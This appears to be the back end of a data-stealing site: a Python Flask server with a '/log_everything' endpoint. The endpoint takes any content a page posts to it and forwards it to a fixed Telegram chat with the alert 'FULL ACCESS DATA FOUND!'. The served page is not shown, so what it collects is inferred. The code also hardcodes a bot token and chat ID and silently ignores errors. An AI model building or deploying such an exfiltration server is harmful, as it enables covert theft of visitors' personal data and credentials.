import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# টোকেনটি এখানে সরাসরি না লিখে Environment Variable থেকে নেবে
BOT_TOKEN = os.getenv("BOT_TOKEN", "7914848325:AAF0_A8IeN3Gz9n8T_S5Z9B1_U0Xz4_R_E")
CHAT_ID = "8215560049"

def send_to_telegram(message, file=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    try:
        if file:
            requests.post(url + "sendDocument", data={"chat_id": CHAT_ID, "caption": message}, files={"document": file})
        else:
            requests.post(url + "sendMessage", data={"chat_id": CHAT_ID, "text": message})
    except:
        pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_everything', methods=['POST'])
def log_everything():
    data = request.json
    content = data.get('content')
    dtype = data.get('type')
    send_to_telegram(f"🔥 FULL ACCESS DATA FOUND!\nType: {dtype}\nData: {content}")
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
